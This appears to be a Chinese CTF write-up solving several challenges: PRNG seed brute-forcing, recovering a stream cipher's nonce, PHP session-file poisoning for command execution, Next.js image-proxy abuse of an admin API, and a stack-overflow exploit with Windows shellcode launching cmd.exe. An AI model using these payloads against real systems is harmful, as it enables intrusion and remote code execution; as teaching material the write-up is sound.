<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mt. Random</title>
</head>
<body>
    <h1>Hiking Guide</h1>
    <p>This mountain is boring, I'm going to sample alot of seeds!</p>
    <a href="?generate_samples=1">Get a new sample</a>
</body>
</html>

大意是将flag编码，然后设置随机种子，接着在设定的范围内产生随机值。

提示是Maybe we can recover these constants，因此可以恢复min、max、gap_start、gap_end。

import requests

samples = []
for i in range(100):
    try:
        res = requests.get("http://mtrandom-1.play.hfsc.tf:51237/?generate_samples=1").json()["samples"]
        samples.append(res)
    except Exception as e:
        pass
print(samples)

拿了一百组数据同non_continuous_sample方法一起分析，发现min和max很好确定，是1和256。

而当随机数大于gap_start的时候，会加上gap_end-gap_start的值，这里把它称为gap的值。

通过观察数据，可以发现按顺序递增排列的时候，数据在某个阶段会存在一个较大的递增增量，那么这个增量就应该是gap的值了，而增量前的数据，就是gap_start的值。

from collections import Counter

samples = [[1, 183, 26, 150, 183, 14, 60, 207, 99, 1, 209, 150, 26, 89, 207, 60, 198, 89, 14, 238, 76, 68],
           [228, 45, 158, 24, 45, 246, 244, 233, 29, 228, 30, 24, 158, 177, 233, 244, 74, 177, 246, 2, 158, 248],
           [173, 99, 219, 207, 99, 59, 223, 218, 42, 173, 180, 207, 219, 81, 218, 223, 179, 81, 59, 246, 227, 202],
           [15, 14, 39, 30, 14, 228, 75, 19, 7, 15, 17, 30, 39, 21, 19, 75, 209, 21, 228, 179, 150, 99],
           [156, 248, 14, 183, 248, 220, 171, 19, 191, 156, 246, 183, 14, 84, 19, 171, 33, 84, 220, 188, 91, 87],
           [31, 30, 224, 90, 30, 32, 195, 63, 183, 31, 174, 90, 224, 186, 63, 195, 59, 186, 32, 38, 183, 27],
           [151, 150, 240, 219, 150, 237, 32, 26, 36, 151, 85, 219, 240, 253, 26, 32, 70, 253, 237, 9, 232, 85],
           [87, 253, 96, 223, 253, 165, 63, 197, 212, 87, 159, 223, 96, 84, 197, 63, 188, 84, 165, 210, 226, 82],
           [97, 217, 161, 59, 217, 169, 170, 26, 221, 97, 156, 59, 161, 81, 26, 170, 235, 81, 169, 231, 180, 229],
           [187, 186, 162, 225, 186, 66, 228, 153, 89, 187, 12, 225, 162, 32, 153, 228, 29, 32, 66, 75, 165, 71],
           [6, 1, 159, 37, 1, 189, 31, 167, 213, 6, 225, 37, 159, 90, 167, 31, 224, 90, 189, 197, 37, 250],
           [150, 232, 220, 196, 232, 65, 88, 208, 175, 150, 57, 196, 220, 90, 208, 88, 61, 90, 65, 34, 231, 189],
           [92, 170, 63, 183, 170, 255, 11, 42, 20, 92, 219, 183, 63, 169, 42, 11, 84, 169, 255, 196, 48, 38],
           [243, 150, 250, 167, 150, 185, 183, 227, 158, 243, 29, 167, 250, 206, 227, 183, 1, 206, 185, 96, 223, 254],
           [8, 17, 89, 84, 17, 75, 64, 72, 247, 8, 213, 84, 89, 180, 72, 64, 235, 180, 75, 99, 92, 189],
           [165, 75, 66, 256, 75, 254, 230, 196, 193, 165, 75, 256, 66, 44, 196, 230, 3, 44, 254, 151, 94, 55],
           [225, 253, 249, 24, 253, 152, 92, 65, 206, 225, 183, 24, 249, 235, 65, 92, 158, 235, 152, 201, 158, 72],
           [218, 204, 179, 256, 204, 12, 235, 89, 32, 218, 7, 256, 179, 183, 89, 235, 88, 183, 12, 217, 39, 190],
           [25, 234, 237, 82, 234, 88, 232, 27, 207, 25, 219, 82, 237, 252, 27, 232, 68, 252, 88, 89, 240, 35],
           [46, 208, 181, 209, 208, 74, 84, 48, 193, 46, 191, 209, 181, 153, 48, 84, 218, 153, 74, 198, 41, 21],
           [57, 1, 90, 221, 1, 183, 243, 190, 150, 57, 220, 221, 90, 41, 190, 243, 197, 41, 183, 183, 247, 159],
           [12, 256, 81, 5, 256, 221, 12, 15, 74, 12, 194, 5, 81, 94, 15, 12, 156, 94, 221, 151, 17, 82],
           [84, 211, 170, 74, 211, 206, 211, 163, 60, 84, 246, 74, 170, 159, 163, 211, 180, 159, 206, 90, 69, 214],
           [220, 17, 158, 226, 17, 251, 203, 14, 6, 220, 215, 226, 158, 55, 14, 203, 81, 55, 251, 92, 89, 31],
           [34, 94, 225, 225, 94, 31, 248, 63, 33, 34, 185, 225, 225, 60, 63, 248, 71, 60, 31, 206, 183, 97],
           [178, 157, 172, 97, 157, 213, 29, 218, 151, 178, 252, 97, 172, 210, 218, 29, 97, 210, 213, 28, 156, 90],
           [56, 196, 215, 172, 196, 222, 183, 83, 96, 56, 95, 172, 215, 1, 83, 183, 14, 1, 222, 210, 195, 237],
           [65, 17, 221, 62, 17, 180, 97, 81, 71, 65, 232, 62, 221, 15, 81, 97, 30, 15, 180, 163, 82, 10],
           [35, 38, 202, 1, 38, 242, 230, 207, 11, 35, 193, 1, 202, 157, 207, 230, 41, 157, 242, 191, 235, 24],
           [160, 183, 222, 11, 183, 199, 61, 44, 239, 160, 202, 11, 222, 229, 44, 61, 56, 229, 199, 7, 190, 208],
           [211, 181, 84, 42, 181, 40, 152, 75, 239, 211, 187, 42, 84, 80, 75, 152, 205, 80, 40, 229, 197, 88],
           [81, 99, 214, 233, 99, 202, 87, 29, 241, 81, 205, 233, 214, 75, 29, 87, 70, 75, 202, 214, 192, 253],
           [72, 32, 177, 52, 32, 218, 22, 188, 151, 72, 253, 52, 177, 69, 188, 22, 80, 69, 218, 67, 252, 37],
           [82, 237, 19, 174, 237, 24, 249, 167, 92, 82, 74, 174, 19, 77, 167, 249, 213, 77, 24, 151, 229, 207],
           [207, 174, 25, 35, 174, 69, 256, 172, 200, 207, 204, 35, 25, 199, 172, 256, 221, 199, 69, 45, 191, 243],
           [49, 64, 210, 204, 64, 209, 34, 5, 215, 49, 157, 204, 210, 4, 5, 34, 79, 4, 209, 49, 207, 172],
           [29, 38, 36, 248, 38, 247, 204, 152, 251, 29, 60, 248, 36, 69, 152, 204, 196, 69, 247, 239, 84, 174],
           [224, 239, 218, 172, 239, 201, 195, 244, 65, 224, 26, 172, 218, 207, 244, 195, 69, 207, 201, 175, 84, 153],
           [78, 13, 15, 73, 13, 218, 5, 165, 234, 78, 182, 73, 15, 216, 165, 5, 24, 216, 218, 68, 171, 235],
           [90, 229, 214, 62, 229, 25, 52, 161, 15, 90, 192, 62, 214, 256, 161, 52, 208, 256, 25, 184, 60, 229],
           [46, 231, 23, 166, 231, 179, 65, 212, 247, 46, 152, 166, 23, 12, 212, 65, 48, 12, 179, 192, 157, 92],
           [70, 80, 11, 57, 80, 226, 92, 24, 26, 70, 242, 57, 11, 254, 24, 92, 248, 254, 226, 198, 237, 233],
           [252, 166, 161, 84, 166, 215, 209, 231, 72, 252, 24, 84, 161, 156, 231, 209, 23, 156, 215, 195, 164, 225],
           [63, 26, 228, 71, 26, 189, 178, 8, 41, 63, 168, 71, 228, 49, 8, 178, 249, 49, 189, 240, 15, 216],
           [34, 210, 4, 64, 210, 228, 1, 78, 237, 34, 59, 64, 4, 74, 78, 1, 53, 74, 228, 163, 169, 61],
           [248, 38, 198, 96, 38, 225, 216, 23, 82, 248, 9, 96, 198, 207, 23, 216, 91, 207, 225, 213, 37, 200],
           [62, 65, 218, 222, 65, 197, 229, 43, 2, 62, 3, 222, 218, 50, 43, 229, 96, 50, 197, 182, 174, 43],
           [206, 173, 234, 94, 173, 46, 155, 203, 169, 206, 253, 94, 234, 160, 203, 155, 180, 160, 46, 171, 11, 239],
           [6, 68, 74, 168, 68, 233, 250, 165, 155, 6, 188, 168, 74, 6, 165, 250, 46, 6, 233, 178, 199, 88],
           [253, 34, 256, 254, 34, 167, 69, 78, 47, 253, 224, 254, 256, 154, 78, 69, 188, 154, 167, 90, 166, 185],
           [95, 241, 206, 15, 241, 52, 236, 194, 173, 95, 223, 15, 206, 210, 194, 236, 42, 210, 52, 256, 36, 187],
           [231, 173, 57, 44, 173, 162, 176, 253, 241, 231, 51, 44, 57, 68, 253, 176, 95, 68, 162, 242, 240, 6],
           [199, 1, 155, 42, 1, 202, 225, 201, 219, 199, 90, 42, 155, 53, 201, 225, 186, 53, 202, 81, 215, 222],
           [167, 56, 82, 228, 56, 223, 99, 39, 70, 167, 232, 228, 82, 44, 39, 99, 251, 44, 223, 21, 241, 227],
           [37, 219, 217, 38, 219, 51, 200, 175, 89, 37, 26, 38, 217, 218, 175, 200, 244, 218, 51, 226, 207, 154],
           [56, 52, 191, 12, 52, 38, 27, 73, 205, 56, 59, 12, 191, 25, 73, 27, 181, 25, 38, 2, 32, 96],
           [200, 46, 63, 57, 46, 85, 229, 32, 91, 200, 214, 57, 63, 68, 32, 229, 174, 68, 85, 92, 168, 49],
           [38, 51, 16, 51, 51, 49, 25, 255, 38, 38, 86, 51, 16, 37, 255, 25, 21, 37, 49, 84, 184, 54],
           [253, 206, 183, 10, 206, 47, 21, 211, 207, 253, 153, 10, 183, 46, 211, 21, 234, 46, 47, 223, 67, 168],
           [235, 175, 70, 5, 175, 190, 227, 249, 245, 235, 89, 5, 70, 194, 249, 227, 14, 194, 190, 72, 34, 86],
           [60, 40, 21, 220, 40, 211, 71, 216, 193, 60, 23, 220, 21, 44, 216, 71, 38, 44, 211, 150, 255, 232],
           [160, 54, 195, 221, 54, 150, 212, 163, 91, 160, 237, 221, 195, 7, 163, 212, 56, 7, 150, 156, 211, 49],
           [89, 224, 165, 225, 224, 54, 184, 157, 8, 89, 79, 225, 165, 49, 157, 184, 72, 49, 54, 58, 155, 201],
           [31, 155, 42, 49, 155, 22, 227, 34, 212, 31, 175, 49, 42, 70, 34, 227, 9, 70, 22, 243, 41, 192],
           [77, 41, 6, 91, 41, 37, 58, 250, 174, 77, 218, 91, 6, 31, 250, 58, 217, 31, 37, 176, 3, 184],
           [230, 28, 216, 18, 28, 76, 234, 60, 223, 230, 197, 18, 216, 226, 60, 234, 159, 226, 76, 93, 23, 150],
           [10, 235, 67, 162, 235, 72, 211, 179, 84, 10, 39, 162, 67, 158, 179, 211, 233, 158, 72, 4, 241, 250],
           [44, 244, 64, 37, 244, 249, 1, 220, 48, 44, 218, 37, 64, 50, 220, 1, 30, 50, 249, 38, 226, 19],
           [68, 51, 167, 19, 51, 50, 53, 28, 252, 68, 216, 19, 167, 79, 28, 53, 27, 79, 50, 208, 1, 224],
           [12, 28, 3, 155, 28, 78, 88, 152, 91, 12, 64, 155, 3, 82, 152, 88, 242, 82, 78, 226, 245, 1],
           [255, 31, 236, 37, 31, 226, 224, 72, 214, 255, 254, 37, 236, 256, 72, 224, 176, 256, 226, 44, 3, 68],
           [207, 233, 150, 6, 233, 232, 51, 55, 220, 207, 87, 6, 150, 229, 55, 51, 15, 229, 232, 74, 239, 216],
           [77, 198, 205, 57, 198, 51, 188, 198, 61, 77, 225, 57, 205, 152, 198, 188, 74, 152, 51, 82, 202, 209],
           [195, 151, 49, 223, 151, 220, 224, 183, 220, 195, 166, 223, 49, 33, 183, 224, 228, 33, 220, 69, 41, 7],
           [216, 161, 88, 65, 161, 49, 172, 8, 161, 216, 176, 65, 88, 83, 8, 172, 219, 83, 49, 89, 96, 207],
           [22, 190, 33, 155, 190, 168, 174, 231, 93, 22, 154, 155, 33, 213, 231, 174, 99, 213, 168, 250, 159, 4],
           [73, 45, 87, 23, 45, 99, 235, 21, 15, 73, 4, 23, 87, 85, 21, 235, 39, 85, 99, 40, 241, 224],
           [241, 240, 5, 189, 240, 255, 75, 6, 233, 241, 70, 189, 5, 225, 6, 75, 167, 225, 255, 31, 77, 154],
           [24, 159, 92, 16, 159, 3, 70, 23, 163, 24, 43, 16, 92, 215, 23, 70, 212, 215, 3, 66, 72, 24],
           [51, 45, 65, 62, 45, 63, 88, 204, 74, 51, 39, 62, 65, 179, 204, 88, 54, 179, 63, 187, 223, 68],
           [48, 67, 1, 188, 67, 2, 84, 47, 77, 48, 53, 188, 1, 168, 47, 84, 62, 168, 2, 216, 204, 70],
           [153, 229, 96, 94, 229, 237, 51, 201, 73, 153, 175, 94, 96, 208, 201, 51, 58, 208, 237, 60, 185, 189],
           [185, 223, 181, 89, 223, 185, 186, 253, 184, 185, 224, 89, 181, 165, 253, 186, 249, 165, 185, 227, 162, 63],
           [249, 240, 27, 70, 240, 7, 248, 173, 11, 249, 11, 70, 27, 85, 173, 248, 85, 85, 7, 34, 82, 59],
           [192, 232, 165, 205, 232, 95, 39, 163, 67, 192, 71, 205, 165, 99, 163, 39, 10, 99, 95, 73, 233, 166],
           [80, 198, 209, 213, 198, 41, 47, 158, 218, 80, 217, 213, 209, 252, 158, 47, 15, 252, 41, 73, 180, 89],
           [237, 82, 153, 207, 82, 195, 219, 195, 219, 237, 14, 207, 153, 243, 195, 219, 212, 243, 195, 169, 85, 163],
           [73, 45, 87, 23, 45, 99, 235, 21, 15, 73, 4, 23, 87, 85, 21, 235, 39, 85, 99, 40, 241, 224],
           [241, 21, 46, 91, 21, 19, 62, 13, 217, 241, 2, 91, 46, 15, 13, 62, 14, 15, 19, 22, 159, 151],
           [90, 37, 217, 91, 37, 82, 182, 244, 96, 90, 51, 91, 217, 64, 244, 182, 164, 64, 82, 211, 158, 46],
           [256, 7, 4, 23, 7, 80, 154, 233, 50, 256, 180, 23, 4, 192, 233, 154, 163, 192, 80, 237, 168, 256],
           [50, 175, 80, 46, 175, 222, 82, 251, 44, 50, 76, 46, 80, 46, 251, 82, 64, 46, 222, 220, 84, 62],
           [190, 197, 229, 55, 197, 83, 13, 81, 78, 190, 229, 55, 229, 32, 81, 13, 84, 32, 83, 1, 71, 81],
           [83, 210, 219, 32, 210, 202, 203, 153, 236, 83, 29, 32, 219, 242, 153, 203, 218, 242, 202, 57, 239, 78],
           [51, 22, 235, 179, 22, 47, 224, 164, 72, 51, 74, 179, 235, 234, 164, 224, 202, 234, 47, 91, 219, 220],
           [7, 251, 45, 41, 251, 208, 226, 33, 21, 7, 218, 41, 45, 67, 33, 226, 83, 67, 208, 253, 49, 8],
           [215, 162, 185, 254, 162, 162, 201, 63, 34, 215, 5, 254, 185, 186, 63, 201, 244, 186, 162, 165, 212, 256],
           [26, 167, 192, 177, 167, 53, 82, 206, 220, 26, 207, 177, 192, 74, 206, 82, 180, 74, 53, 2, 173, 166],
           [209, 248, 87, 152, 248, 73, 95, 210, 61, 209, 230, 152, 87, 66, 210, 95, 39, 66, 73, 160, 184, 236],
           [151, 169, 246, 96, 169, 234, 57, 39, 34, 151, 179, 96, 246, 178, 39, 57, 61, 178, 234, 238, 80, 73]]

def get_max(array):
    array.sort()
    max_difference = 0
    split_index = 0

    for i in range(1, len(array)):
        difference = array[i] - array[i - 1]
        if difference > max_difference:
            max_difference = difference
            split_index = i

    smaller_array = array[:split_index]

    smaller_array_max = max(smaller_array)
    return smaller_array_max

max_list = []
for i in samples:
    max_list.append(get_max(i))

counter = Counter(max_list)
most_common_count = counter.most_common(1)[0][1]

most_common_max = 0
for item, count in counter.items():
    if count == most_common_count and item > most_common_max:
        most_common_max = item

print(most_common_max)

将这组数递增排序，接着求数组中的两两差值，按照最大差值将数组分开，然后求较小的数组中的最大值，这个时候的最大值就是gap_start了。

但是由于随机性，可能有那么一两组数会在后面也会随机到较大增量的数，所以需要求这组数中出现次数最多的最大的数，结果是99。

<?php
session_start();

$flag = "midnight{";

function flag_to_numbers($flag)
{
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

function non_continuous_sample($min, $max, $gap_start, $gap_end)
{
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

if (!str_starts_with($flag, "midnight{")) {
    echo "Come back later.n";
    exit();
}
$res = [81, 96, 235, 178, 96, 30, 241, 58, 68];

$flag_numbers = flag_to_numbers($flag);

// Maybe we can recover these constants
$min = 1;
$max = 256;
$gap_start = 99;
for ($gap_end = 99; $gap_end < 256; $gap_end++) {
    for ($seed = 0; $seed < 10000; $seed++) {
        $samples = [];
        foreach ($flag_numbers as $number) {
            mt_srand($seed + $number);
            $samples[] = non_continuous_sample($min, $max, $gap_start, $gap_end);
        }
        echo "$gap_end: $gap_end,seed: $seedn";
        if ($samples === $res) {
            var_dump("fuckyou");
            var_dump($seed);
            exit();
        }
    }
}
?>

根据题目，开头必为**midnight{**，因此可以用来爆破。

已知gap_start为99，而max为256，故gap_end在99到256之间，而一开始的seed在10000内产生，这个爆破次数可以接受，结果是gap_end为149，seed为7488。

<?php
function non_continuous_sample($min, $max, $gap_start, $gap_end, $seed)
{
    srand($seed);
    $rand_num = rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += $gap_end - $gap_start;
    }
    return $rand_num;
}

$min = 1;
$max = 256;
$gap_start = 99;
$gap_end = 149;
$seed = 7488;
function flag_to_numbers($flag)
{
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

$table = "1234567890qwertyuiopasdfghjklzxcvbnm_{}";
$table = flag_to_numbers($table);
$samples = [81, 96, 235, 178, 96, 30, 241, 58, 68, 81, 78, 178, 235, 171, 58, 241, 179, 171, 30, 65, 175, 8];
$c = 0;
$flag = "";
echo("[</br>");
foreach ($samples as $n) {
    foreach ($table as $t) {
        $generated_sample = non_continuous_sample($min, $max, $gap_start, $gap_end, $seed + $t);
        if ($generated_sample === $n) {
            echo("$c =>['" . chr($t) . "'],</br>");
        }
    }
    $c += 1;
}
echo("]</br>");
?>

接下来就是继续爆破了，但是最后某些位置的字符会生成一样的随机结果，好在不多，而且flag是有意义的字符串，所以比较好辨认。

输出结果如下，前9位和最后1位是**midnight{和}**，因此可以筛一下。

[
0 =>['f'],
0 =>['m'],
1 =>['i'],
2 =>['u'],
2 =>['d'],
3 =>['n'],
4 =>['i'],
5 =>['2'],
5 =>['g'],
6 =>['h'],
7 =>['t'],
8 =>['{'],
9 =>['f'],
9 =>['m'],
10 =>['1'],
11 =>['n'],
12 =>['u'],
12 =>['d'],
13 =>['_'],
14 =>['t'],
15 =>['h'],
16 =>['3'],
17 =>['_'],
18 =>['2'],
18 =>['g'],
19 =>['4'],
19 =>['q'],
19 =>['x'],
20 =>['p'],
21 =>['j'],
21 =>['}'],
]

最后依次打印。

<?php

$chars = [
    0 => ['m'],
    1 => ['i'],
    2 => ['d'],
    3 => ['n'],
    4 => ['i'],
    5 => ['g'],
    6 => ['h'],
    7 => ['t'],
    8 => ['{'],
    9 => ['f', 'm'],
    10 => ['1'],
    11 => ['n'],
    12 => ['u', 'd'],
    13 => ['_'],
    14 => ['t'],
    15 => ['h'],
    16 => ['3'],
    17 => ['_'],
    18 => ['2', 'g'],
    19 => ['4', 'q', 'x'],
    20 => ['p'],
    21 => ['}']
];

function generate_combinations($chars, $index = 0, $current = "")
{
    if ($index >= count($chars)) {
        echo $current . PHP_EOL . "</br>";
        return;
    }

    foreach ($chars[$index] as $char) {
        generate_combinations($chars, $index + 1, $current . $char);
    }
}

generate_combinations($chars);

?>

输出结果如下。

midnight{f1nu_th3_24p}
midnight{f1nu_th3_2qp}
midnight{f1nu_th3_2xp}
midnight{f1nu_th3_g4p}
midnight{f1nu_th3_gqp}
midnight{f1nu_th3_gxp}
midnight{f1nd_th3_24p}
midnight{f1nd_th3_2qp}
midnight{f1nd_th3_2xp}
midnight{f1nd_th3_g4p}
midnight{f1nd_th3_gqp}
midnight{f1nd_th3_gxp}
midnight{m1nu_th3_24p}
midnight{m1nu_th3_2qp}
midnight{m1nu_th3_2xp}
midnight{m1nu_th3_g4p}
midnight{m1nu_th3_gqp}
midnight{m1nu_th3_gxp}
midnight{m1nd_th3_24p}
midnight{m1nd_th3_2qp}
midnight{m1nd_th3_2xp}
midnight{m1nd_th3_g4p}
midnight{m1nd_th3_gqp}
midnight{m1nd_th3_gxp}

比较像的是**midnight{f1nd_th3_g4p}和midnight{m1nd_th3_g4p}**，交了一下，第二个对了。

ikea

ikea

fact check

非预期了

拖ida64能看到flag

image-20230408194800501

midnight{s0me0ne_sh0u1d_f4cT_cH3ck_tH3s3_AIs}

dancing bits

题目：

import os
import zlib
from flask import Flask, request, jsonify
from secrets import token_bytes

app = Flask(__name__)

# The secret key and nonce for the DancingBits stream cipher
SECRET_KEY = int.from_bytes(token_bytes(4), 'big')
NONCE = int.from_bytes(token_bytes(4), 'big')

FLAG = ""

def lfsr(state):
    bit = ((state >> 31) ^ (state >> 21) ^ (state >> 1) ^ state) & 1
    return (state << 1) | bit

def rotl(x, k):
    return ((x << k) | (x >> (8 - k))) & 0xff

def swap(x):
    return ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)

def dancingbits_encrypt(plaintext, key, nonce):
    state = (key << 32) | nonce
    ciphertext = bytearray()

    for byte in plaintext:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = byte ^ ks_byte
        c = rotl(c, 3)
        c = swap(c)
        ciphertext.append(c)

    return ciphertext

def dancingbits_decrypt(ciphertext, key, nonce):
    state = (key << 32) | nonce
    plaintext = bytearray()

    for byte in ciphertext:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = swap(byte)
        c = rotl(c, -3)
        p = c ^ ks_byte
        plaintext.append(p)

    return plaintext

@app.route('/encrypted_flag', methods=['GET'])
def encrypted_flag():
    compressed_flag = zlib.compress(FLAG.encode('utf-8'))
    encrypted_flag = dancingbits_encrypt(compressed_flag, SECRET_KEY, NONCE)
    return encrypted_flag

@app.route('/decrypt_oracle', methods=['POST'])
def decrypt_oracle():
    encrypted_data = request.data

    if len(encrypted_data) < 1:
        return jsonify(status=500, message="Error: Data too short")

    try:
        decrypted_data = dancingbits_decrypt(encrypted_data, SECRET_KEY, NONCE)
        decompressed_data = zlib.decompress(decrypted_data)

        for i in range(len(decompressed_data.decode('utf-8'))):
            if decompressed_data.decode('utf-8')[i] == FLAG[i]:
                return jsonify(status=500, message="Error: CTF character at index found: " + str(i))
        return jsonify(status=200, message="Success")
    except Exception as e:
        return jsonify(status=500, message="Error")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

题解：

题目中decrypt_oracle()下rotl(c, -3)写法有误，导致无法利用web端的decrypt_oracle。

但通过flag已知前缀midnight{可获得nonce的18bit数据，又由分析可知此系统中决定lfsr输出的因素只有32位的nonce，爆破所有可能nonce下密文解密的结果，若符合格式则得解。

import zlib, requests,sys
from secrets import token_bytes

def lfsr(state):
    bit = ((state >> 31) ^ (state >> 21) ^ (state >> 1) ^ state) & 1  # mask已知
    return (state << 1) | bit

def rotl(x, k):
    if k > 0:
        return ((x << k) | (x >> (8 - k))) & 0xff  # 高k位移到低k位
    if k < 0:
        return ((x >> -k) | (x << (8 + k))) & 0xff

def swap(x):
    return ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)  # 前后4位交换

def find_max_same(a, b):
    for i in range(len(a)):
        if a[:i] != b[:i]:
            return a[:i - 1]

def dancingbits(cs, key, nonce):
    state = (key << 32) | nonce
    plain = []
    for c in cs:
        state = lfsr(state)
        ks_byte = (state >> 24) & 0xff
        c = swap(c)
        c = rotl(c, -3)
        m = c ^ ks_byte
        plain.append(m)
    return bytes(plain)

url = 'http://dancingbits-1.play.hfsc.tf:23105'
req = requests.get(url + '/encrypted_flag')
encrypted_flag = req.content
print(encrypted_flag)

FLAG = "midnight{"
c1 = zlib.compress(FLAG.encode('utf-8'))  # flag = zlib.decompress(compressed_flag)
FLAG = "midnight{asdfho234_dakjfbk2_0HB_test}"
c2 = zlib.compress(FLAG.encode('utf-8'))  # flag = zlib.decompress(compressed_flag)

known = find_max_same(c1, c2)
print(len(known))

NONCE = 0
SECRET_KEY = int.from_bytes(token_bytes(4), 'big')  # 无关紧要，随机取
for i in range(len(known)):
    c = encrypted_flag[i]
    c = swap(c)
    c = rotl(c, -3)
    ks_byte = c ^ known[i]
    if i == 0:
        NONCE = ks_byte
        print('ks =', bin(ks_byte)[2:].zfill(8))
    else:
        NONCE = (NONCE << 1) + (ks_byte & 1)

tmp = 32 - 19  # 实际测试测试，发现是 最高位未知+中间18位+低13位未知
NONCE1 = NONCE << tmp  # 0+xxx+x
for i in range(1 << tmp):
    NONCE1 += 1

    tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE1)
    try:
        tmp_flag = zlib.decompress(tmp_compressed_flag)
    except:
        continue
    if b'midnight{' in tmp_flag:
        print(tmp_flag)
        sys.exit(1)

NONCE2 = (NONCE << tmp)+(1<<31)  # 1+xxx+x
for i in range(1 << tmp):
    NONCE2 += 1
    tmp_compressed_flag = dancingbits(encrypted_flag, SECRET_KEY, NONCE2)
    try:
        tmp_flag = zlib.decompress(tmp_compressed_flag)
    except:
        continue
    if b'midnight{' in tmp_flag:
        print(tmp_flag)
        sys.exit(1)
# midnight{th3_h0t_n3w_str3am_c1pher}

WEB

matchmaker

属于是非预期了，官方忘把日志给删了，日志里面找flag就行了

findianajones

题目一开始只给了cmd和path两个参数，猜测cmd可以传入被执行的php函数，path则是其参数，想到传入?cmd=readfile&path=index.php来读取源代码：

image-20230410112748766

<?php
ini_set("allow_url_fopen", 0);
ini_set("allow_url_include", 0);
session_start();

if(isset($_GET['cmd'])){
    $_GET['cmd'](strval($_GET['path'])); # One argument for babies
    echo "Still no shell? ".$_SESSION['attempts']." tries and counting :-)<br>n";

    $_SESSION['attempts'] = (isset($_SESSION['attempts']) ? $_SESSION['attempts']+1 : $_SESSION['attempts']=1);

    if(isset($_GET['hiddenschmidden'])){
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w")
        );
        $proc = proc_open(['chmod','+x',strval($_GET['path'])], $descriptorspec, $pipes);
        proc_close($proc);
        $proc = proc_open([strval($_GET['path'])], $descriptorspec, $pipes2); #No argument for haxors
        echo @stream_get_contents($pipes2[1]);
        proc_close($proc);
    }
    die();
}

发现当传入hiddenschmidden是，path会被拿去给proc_open执行，执行ls命令后发现目录下面存在flag_dispenser文件，但需要传入GIVEMEFLAG参数。执行phpinfo()后发现session文件存储在/var/www/sessions中，可以在$_GET['cmd'](strval($_GET['path']));利用session_decode函数来污染session文件。payload如下：

<?php
session_start();
$exp = '#!/bin/bash
./flag_dispenser GIVEMEFLAG
';

$_SESSION[$exp] = '';
echo session_encode();

将脚本输出的值url编码后%23%21%2Fbin%2Fbash%0A%2E%2Fflag%5Fdispenser%20GIVEMEFLAG%0A%7Cs%3A0%3A%22%22%3B提交给path就行

成功污染session文件。

midnight{j00_f0und_m3_but_was_th4t_wut_uR_l00kinG_4?}

mouldylocks

观察js页面发现有一个设置admin的api /api/admin/setAdmin, 通过调用 /_next/image?url=/api/admin/setAdmin?username=crypt0n&w=64&q=100 把自己设置成admin后访问flag地址。

image-20230410124801111

midnight{y3t_@n0th3r_un3xp3ted_mIddl3ware_problem???}

MISC

sanity

一个直接的签到题，将题目给的shell命令放到终端执行就出flag了

whistle

本题是考了一个G-CODE

我们找到一个在线网站进行解析，发现有许多的重复项目，我们手动修一下可以大致看出来两个东西

前面很大一部分都是对redacted的重复，尝试了几次将其输入进flag中发现都不对，故我们将其理解为干扰项，也就是router_hacking?才是真的flag值，我们故flag包裹上midnight{}即可

flag：midnight{router_hacking?}

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

r = remote('pyttemjuk-1.play.hfsc.tf', 1337)
#r = remote('192.168.10.107', 1234)
pause()

gets_plt = 0x40263C
bss_addr = 0x405090

p1 = b'a' * (0x14 + 4 + 0x8)
p1 += p32(gets_plt)
p1 += p32(0x401575)
p1 += p32(bss_addr)

r.sendlineafter('Enter your name: ', p1)

p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx40x1cx8bx04x08x8bx04x08x8bx58x08x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x49x8bx72x24x01xdex66x8bx0cx4ex8bx72x1cx01xdex8bx14x8ex01xdax89xd6x31xc9x51x68x45x78x65x63x68x41x57x69x6ex89xe1x8dx49x01x51x53xffxd6x87xfax89xc7x31xc9x51x68x72x65x61x64x68x69x74x54x68x68x41x41x45x78x89xe1x8dx49x02x51x53xffxd6x89xc6x31xc9x51x68x65x78x65x20x68x63x6dx64x2ex89xe1x6ax01x51xffxd7x31xc9x51xffxd6'
#p2 = b'bbbb'
